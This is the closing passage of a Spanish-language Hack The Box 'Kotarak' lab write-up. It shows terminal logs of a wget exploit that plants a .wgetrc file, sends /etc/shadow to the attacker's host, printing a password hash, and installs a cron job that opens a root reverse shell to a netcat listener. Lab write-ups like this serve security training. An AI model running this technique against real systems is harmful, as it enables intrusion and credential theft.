+<span class="o">[</span>I 2021-10-19 17:14:56] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:21, <span class="nv">pid</span><span class="o">=</span>325633 <span class="o">&lt;&lt;&lt;</span>
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p>Y ahora si ejecutamos el exploit en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span>authbind python wget-exploit.py
+Ready? Is your FTP server running?
+FTP found open on 10.10.14.16:21. Let<span class="s1">'s go then
+                                
+Serving wget exploit on port 80...
+                                
+                                                                
+We have a volunteer requesting /archive.tar.gz by GET :)
+                                                                
+Uploading .wgetrc via ftp redirect vuln. It should land in /root  
+                                
+10.0.3.133 - - [19/Oct/2021 18:22:01] "GET /archive.tar.gz HTTP/1.1" 301 -
+Sending redirect to ftp://anonymous@10.10.14.16:21/.wgetrc 
+                                                                                                                                 
+We have a volunteer requesting /archive.tar.gz by POST :)
+                                
+Received POST from wget, this should be the extracted /etc/shadow file:
+---[begin]---                                                   
+ root:*:17366:0:99999:7:::                                                                                                       daemon:*:17366:0:99999:7:::
+bin:*:17366:0:99999:7:::                                                                                                         
+sys:*:17366:0:99999:7:::
+sync:*:17366:0:99999:7:::                                                                                                        
+games:*:17366:0:99999:7:::
+man:*:17366:0:99999:7:::
+lp:*:17366:0:99999:7:::
+mail:*:17366:0:99999:7:::
+news:*:17366:0:99999:7:::
+uucp:*:17366:0:99999:7:::
+proxy:*:17366:0:99999:7:::
+www-data:*:17366:0:99999:7:::
+backup:*:17366:0:99999:7:::
+list:*:17366:0:99999:7:::
+irc:*:17366:0:99999:7:::
+gnats:*:17366:0:99999:7:::
+nobody:*:17366:0:99999:7:::
+systemd-timesync:*:17366:0:99999:7:::
+systemd-network:*:17366:0:99999:7:::
+systemd-resolve:*:17366:0:99999:7:::
+systemd-bus-proxy:*:17366:0:99999:7:::
+syslog:*:17366:0:99999:7:::
+_apt:*:17366:0:99999:7:::
+sshd:*:17366:0:99999:7:::
+ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7:::
+  
+---[eof]---
+
+
+Sending back a cronjob script as a thank-you for the file...
+It should get saved in /etc/cron.d/wget-root-shell on the victim'</span>s host <span class="o">(</span>because of .wgetrc we injected <span class="k">in </span>the GET first response
+<span class="o">)</span>
+10.0.3.133 - - <span class="o">[</span>19/Oct/2021 18:24:01] <span class="s2">"POST /archive.tar.gz HTTP/1.1"</span> 200 -
+
+File was served. Check on /root/hacked-via-wget on the victim<span class="s1">'s host in a minute! :) 
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python <span class="nt">-m</span> pyftpdlib <span class="nt">-p21</span> <span class="nt">-w</span>
+/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
+  RuntimeWarning<span class="o">)</span>
+<span class="o">[</span>I 2021-10-19 17:14:56] concurrency model: async
+<span class="o">[</span>I 2021-10-19 17:14:56] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None
+<span class="o">[</span>I 2021-10-19 17:14:56] passive ports: None
+<span class="o">[</span>I 2021-10-19 17:14:56] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:21, <span class="nv">pid</span><span class="o">=</span>325633 <span class="o">&lt;&lt;&lt;</span>
+<span class="o">[</span>I 2021-10-19 17:16:49] 10.10.10.55:52190-[] FTP session opened <span class="o">(</span>connect<span class="o">)</span>
+<span class="o">[</span>I 2021-10-19 17:17:11] 10.10.10.55:59210-[] FTP session opened <span class="o">(</span>connect<span class="o">)</span>
+<span class="o">[</span>I 2021-10-19 17:17:11] 10.10.10.55:59210-[anonymous] USER <span class="s1">'anonymous'</span> logged <span class="k">in</span><span class="nb">.</span>
+<span class="o">[</span>I 2021-10-19 17:17:13] 10.10.10.55:59210-[anonymous] RETR /home/k4miyo/Documentos/HTB/Kotarak/exploits/.wgetrc <span class="nv">completed</span><span class="o">=</span>1 <span class="nv">bytes</span><span class="o">=</span>70 <span class="nv">seconds</span><span class="o">=</span>0.001
+<span class="o">[</span>I 2021-10-19 17:17:13] 10.10.10.55:59210-[anonymous] FTP session closed <span class="o">(</span>disconnect<span class="o">)</span><span class="nb">.</span>
+<span class="o">[</span>I 2021-10-19 17:21:12] 10.10.10.55:59222-[] FTP session opened <span class="o">(</span>connect<span class="o">)</span>
+<span class="o">[</span>I 2021-10-19 17:21:12] 10.10.10.55:59222-[anonymous] USER <span class="s1">'anonymous'</span> logged <span class="k">in</span><span class="nb">.</span>
+<span class="o">[</span>I 2021-10-19 17:21:13] 10.10.10.55:59222-[anonymous] RETR /home/k4miyo/Documentos/HTB/Kotarak/exploits/.wgetrc <span class="nv">completed</span><span class="o">=</span>1 <span class="nv">bytes</span><span class="o">=</span>70 <span class="nv">seconds</span><span class="o">=</span>0.001
+<span class="o">[</span>I 2021-10-19 17:21:14] 10.10.10.55:59222-[anonymous] FTP session closed <span class="o">(</span>disconnect<span class="o">)</span><span class="nb">.</span>
+^C[I 2021-10-19 17:21:23] received interrupt signal
+<span class="o">[</span>I 2021-10-19 17:21:23] <span class="o">&gt;&gt;&gt;</span> shutting down FTP server, 2 socket<span class="o">(</span>s<span class="o">)</span>, <span class="nv">pid</span><span class="o">=</span>325633 <span class="o">&lt;&lt;&lt;</span>
+<span class="o">[</span>I 2021-10-19 17:21:23] 10.10.10.55:52190-[] FTP session closed <span class="o">(</span>disconnect<span class="o">)</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.55] 37270
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+# whoami
+root
+# hostname -I
+10.0.3.133 
+#
+</span></code></pre></div></div>
+
+<p>Ya nos encontramos en la tercera máquina 10.10.3.133 como el usuario <strong>root</strong> y podemos visualizar la flag (roo.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">XXE</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-19T00:00:00-05:00">October 19, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-haircut/" class="pagination--pager" title="Hack The Box Haircut
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
